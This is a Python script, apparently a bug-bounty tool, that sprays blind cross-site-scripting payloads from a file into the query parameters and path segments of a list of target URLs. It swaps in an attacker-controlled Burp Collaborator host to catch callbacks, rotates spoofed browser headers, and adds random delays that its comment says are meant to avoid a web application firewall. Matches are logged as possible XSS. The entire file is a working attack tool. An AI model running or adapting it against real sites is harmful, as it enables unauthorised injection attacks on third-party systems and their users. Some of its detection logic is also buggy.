import requests
import time
import random
import socket
import urllib.parse

import sys
from datetime import datetime
# usage ====> python3 myxssinparamsURLS.py collaborator

collaborator = sys.argv[1]

pp = [" ","%20","+","%2b","/","%00","%0a","%0b","%bf","%1d","?","%3f","%5c","~","`","|","||","%09","%","@","$","&",";",".","$()","/?","%3f","/;","/.","/./","/..","/..;","/#","#","//","///","/\\","/.\\.\\","\\","/%5c","/%00","/%0a","/%1d","/@","/*","*","/../"]


# List of user agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 HackerOne-0xbsmx0-BB",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0.1 Safari/605.1.15 HackerOne-0xbsmx0-BB",
    "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL Build/QQ1A.200205.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 HackerOne-0xbsmx0-BB",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1 HackerOne-0xbsmx0-BB",
]

# List of Accept headers
accept_headers = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/javascript, */*; q=0.01",
    "application/xml, text/xml, */*; q=0.01",
    "text/plain, */*; q=0.01",
]

# List of Referer headers
referer_headers = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.example.com/",
    "https://www.reddit.com/",
]

# Randomly choose headers
headers = {
            "User-Agent": random.choice(user_agents),
            "Accept": random.choice(accept_headers),
            "Referer": random.choice(referer_headers)
        }

count = 0

print("\033[91m" + "---------red-------" + "\033[0m")
print("\033[92m" + "---------green---------" + "\033[0m")
print("\033[93m" + "---------yellow---------" + "\033[0m")
print("\033[94m" + "---------blue ---------" + "\033[0m")





def exploit():
	
	count = 0
	urlscount = 0
	
	with open('./urls.txt','r') as urls :
		for url in urls.readlines():
			url=url.strip()
			
			urlscount = urlscount + 1
			print("\033[92m" + f"------------url count===>{urlscount} --------" + "\033[0m")
			
			with open('./xss-blind-payloads-BB-py.txt','r') as payloads :
				for payload in payloads.readlines():
					payload=payload.strip()
					
					
					
					
	
					# Step 1: Make an initial request to get cookies

					#initial_response = requests.get(url)

					# Step 2: Extract cookies from the initial response
					#cookies = initial_response.cookies
					
					
					
					# Check if {BC} exists in PAYLOAD
					if '{BC}' in payload:
					
						# replace {BC} with collaborator
					
						payload = payload.replace('{BC}', collaborator)
					

					#encoding payload
					ppayload=urllib.parse.quote_plus(payload)
					
					parsedURL = urllib.parse.urlparse(url)
					pathsplit = parsedURL.path.split("/")
					netloc = parsedURL.netloc
					scheme = parsedURL.scheme
						
					
					if count < 4 : 		
					
						print("\033[92m" + "====scan 1==scheme+netloc + ? + / + /? payload====>" + "\033[0m")
								
						
						count = count + 1
						uri = scheme + '://' + netloc +'?' + payload					
						send(uri,count,payload)

						count = count + 1
						uri = scheme + '://' + netloc +'/' + payload					
						send(uri,count,payload)
						
						count = count + 1
						uri = scheme + '://' + netloc +'/?' + payload					
						send(uri,count,payload)
					
										
					if '?' in url:
					
						base_url, params = url.split('?', 1)
						
						fuzzed_path = pathsplit[:]
						
						if  2 < len(fuzzed_path):
						
							

							#------------------->https://target.com/dir1/dir2/dir3/file?payload
							print("\033[92m" + "=====scan 2===baseurl+  ? + payload==>" + "\033[0m")
							
							
							fuzzed_url = base_url + '?' + ppayload
							count = count + 1	
							send(fuzzed_url,count,payload)

							#------------------->https://target.comdir1/dir2/dir3/file/payload
							print("\033[92m" + "===scan 3===baseurl+  / + payload ===>" + "\033[0m")
							
							fuzzed_url = base_url + '/' + ppayload
							count = count + 1	
							send(fuzzed_url,count,payload)	
							
							#------------------->https://target.comdir1/dir2/dir3/file/?payload
							print("\033[92m" + "===scan 4====baseurl+  /? + payload===>" + "\033[0m")
						
							fuzzed_url = base_url + '/?' + ppayload
							count = count + 1	
							send(fuzzed_url,count,payload)
						
						

						#------------------->https://target.com/dir1/dir2/dir3/file?p1=v1ppayload&p2=v2
						#------------------->https://target.com/dir1/dir2/dir3/file?p1=v1&p2=v2ppayload
						print("\033[92m" + "===scan 5===baseurl+ ? + key=payload====>" + "\033[0m")
																		
						
						
						params = params.split('&')
						for i in range(len(params)):
							key, value = params[i].split('=', 1)
							fuzzed_params = params[:]
							fuzzed_params[i] = f"{key}={value}{ppayload}"
							fuzzed_url = base_url + '?' + '&'.join(fuzzed_params)
							
							count = count + 1
							
							send(fuzzed_url,count,payload)
							
						
	    					#------------------->https://target.com/payload/dir2/dir3/file
						#------------------->https://target.com/dir1/payload/dir3/file
						#------------------->https://target.com/dir1/dir2/payload/file
						#------------------->https://target.com/dir1/dir2/dir3/payload
						print("\033[92m" + "===scan 6===baseurl+  /dir/dir/ + payload /dir/dir====>" + "\033[0m")
					
						if i + 1 <= len(fuzzed_path):
						
							for i in range(len(pathsplit)-1):
									 
								
			    						
			    					fuzzed_path = pathsplit[:]	
				    				fuzzed_path[i+1] = f"{ppayload}"
				    				uri = scheme + '://' + netloc +'/'.join(fuzzed_path)
				    				count = count + 1
				    				send(uri,count,payload)
			    						
	    						
	    						
	    					#------------------->https://target.com/payload/dir2/dir3/file?p1=v1&p2=v2
						#------------------->https://target.com/dir1/payload/dir3/file?p1=v1&p2=v2
						#------------------->https://target.com/dir1/dir2/payload/file?p1=v1&p2=v2
						#------------------->https://target.com/dir1/dir2/dir3/payload?p1=v1&p2=v2
						print("\033[92m" + "===scan 7===baseurl+  /dir/dir/ + payload /dir/dir/?key=val====>" + "\033[0m")
					
		 
	    					   						
						for i in range(len(pathsplit)-1):
								 
							fuzzed_path = pathsplit[:]
							fuzzed_path[i+1] = f"{ppayload}"
							uri = scheme + '://' + netloc +'/'.join(fuzzed_path) + '?' + '&'.join(params)
							count = count + 1
							send(uri,count,payload)	    
	    												
	    					#------------------->https://target.com/dir1/dir2/dir3/file/payload				
	    					#------------------->https://target.com/dir1/dir2/dir3/payload
						#------------------->https://target.com/dir1/dir2/payload
						#------------------->https://target.com/dir1/payload

						print("\033[92m" + "===scan 8===baseurl+  /../../../ + payload====>" + "\033[0m")
					
						
						for i in range(len(pathsplit),0,-1):
							 

						

							if i + 1 <= len(fuzzed_path):
								
								fuzzed_path = pathsplit[:]
								fuzzed_path[i+1:] = [""]  # Adjusted to replace elements beyond i+1 with an empty string

								#fuzzed_path[i+1:] = f""
	
								uri = scheme + '://' + netloc + '/'.join(fuzzed_path)  + ppayload
								count = count + 1
								send(uri,count,payload)
	    						
	    					#------------------->https://target.com/dir1/dir2/dir3/file?payload
	    					#------------------->https://target.com/dir1/dir2/dir3?payload
						#------------------->https://target.com/dir1/dir2?payload
						#------------------->https://target.com/dir1?payload

						
						print("\033[92m" + f"====scan 9==baseurl+  /../../..? + payload====>" + "\033[0m")
						
						
						
						for i in range(len(pathsplit),0,-1):
						

							if i + 1 <= len(fuzzed_path):
								

								fuzzed_path = pathsplit[:]
								fuzzed_path[i+1:] = [""] 
		
								uri = scheme + '://' + netloc + '/'.join(fuzzed_path) + '?' + ppayload
								count = count + 1
								send(uri,count,payload)
	    						
						
					else:
						

						print(f'-------------no ? in url -----{url}----------------------- --------------------------')
						

	    					

	    						
	    						
	    						
	    					#------------------->https://target.com/payload/dir2/dir3/file
						#------------------->https://target.com/dir1/payload/dir3/file
						#------------------->https://target.com/dir1/dir2/payload/file
						#------------------->https://target.com/dir1/dir2/dir3/payload
						
						print("\033[92m" + "====scan 10===baseurl+  /dir/dir/ + payload/dir/dir===>" + "\033[0m")
						

		    					
						for i in range(len(pathsplit)-1):
								 
							fuzzed_path = pathsplit[:]
							fuzzed_path[i+1] = f"{ppayload}"
							uri = scheme + '://' + netloc +'/'.join(fuzzed_path) 
							count = count + 1
							send(uri,count,payload)	    
	    												
	    					#------------------->https://target.com/dir1/dir2/dir3/file/payload				
	    					#------------------->https://target.com/dir1/dir2/dir3/payload
						#------------------->https://target.com/dir1/dir2/payload
						#------------------->https://target.com/dir1/payload

						
						print("\033[92m" + "===scan 11===baseurl+  /../../../ + payload====>" + "\033[0m")
						
						
					
						if  2 < len(fuzzed_path):
						
						
							for i in range(len(pathsplit),0,-1):
								 

								
								if i + 1 <= len(fuzzed_path):
									fuzzed_path = pathsplit[:]
									fuzzed_path[i+1:] = [""] 
			
									uri = scheme + '://' + netloc + '/'.join(fuzzed_path)  + ppayload
									count = count + 1
									send(uri,count,payload)
	    						
	    					#------------------->https://target.com/dir1/dir2/dir3/file?payload
	    					#------------------->https://target.com/dir1/dir2/dir3?payload
						#------------------->https://target.com/dir1/dir2?payload
						#------------------->https://target.com/dir1?payload

						print("\033[92m" + "==scan 12===baseurl+  /../../..? + payload=====>" + "\033[0m")
					
						
					
						if  2 < len(fuzzed_path):
						
							for i in range(len(pathsplit),0,-1):
								 

								
								if i + 1 <= len(fuzzed_path):
									fuzzed_path = pathsplit[:]
									fuzzed_path[i+1:] = [""] 
		
									uri = scheme + '://' + netloc + '/'.join(fuzzed_path) + '?' + ppayload
									count = count + 1
									send(uri,count,payload)

						
						
						print(f"*********************************************************************************************************")
										


										
			payloads.close()										
	
	urls.close()




def send(url,count,payload):
	#global collaborator
	time.sleep(random.uniform(1, 5))  # Random delay between 1 to 5 seconds to avoid waf
	
	

	while True:
		print('[*] Starting test at: ' + str(datetime.now().strftime('%H:%M:%S')))
		print(f">testing url...: {url}")
		print(f">testing  --- {count} ===> {payload}")
		if check_internet():				
			try :
				response = requests.get(url,headers=headers) #,verify=False

			except requests.exceptions.HTTPError as err:
				print(f"Error = {err}")
				break
			except requests.exceptions.Timeout:
				print("=======timeout =============")
				break
			except requests.exceptions.RequestException as err:
				#print(f"---->Connection error: {err}")
				print(f"=====================================ERROR CONNECTION================================================================== ")
				break

				#collaborator = input("Enter your collaborator: ")
				#print("\033[93m" + f"trying collaborator = {collaborator}" + "\033[0m")

			else:
				print(f"---->response time: {response.elapsed.total_seconds()}" )				 
				print(f"--->status: {response.status_code}")
				print(f"--->resp length: {len(response.content)}")
			
				if "hhhhhxss" in response.text or "onerror=alert" in response.text or "onload=alert" in response.text or "{payload}" in response.text or "{ppayload}" in response.text or "hhhhhhhhhhh" in response.text :  
								 
					print("\033[91m" + "======================red xss detcted=============================================" + "\033[0m")
					print("\033[91m"+ f"=======================>Possible xss with payload: {payload}" + "\033[0m")
					with open("xssresultsURLs.txt","a") as f:
						f.write(f"\n*----\n--->Possible xss in {url}---{payload}  \n- at " + str(datetime.now().strftime('%B %d, %Y %H:%M:%S')))
						f.close()
				else:
					print(f"No XSS injection detected ")
					print("\033[94m" + "----------------------No xss check burpCollaborator--------------------------" + "\033[0m")
				print('--------------------------------------------------------------------------------------------------------------')
				break
		else:
			print("..................Waiting for connection to be re-established...............") 
			continue  # This will "pause" by looping until the connection is available again.

# Function to check internet connection by trying to connect to a reliable server
def check_internet(host="8.8.8.8", port=53, timeout=3):
    try:
        # Try to open a connection to a reliable external server (Google's public DNS server)
        socket.setdefaulttimeout(timeout)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
        return True
    except socket.error as ex:
        print(f"=====================No internet connection: {ex}==========================================")
        return False


if __name__ == "__main__":
	exploit()
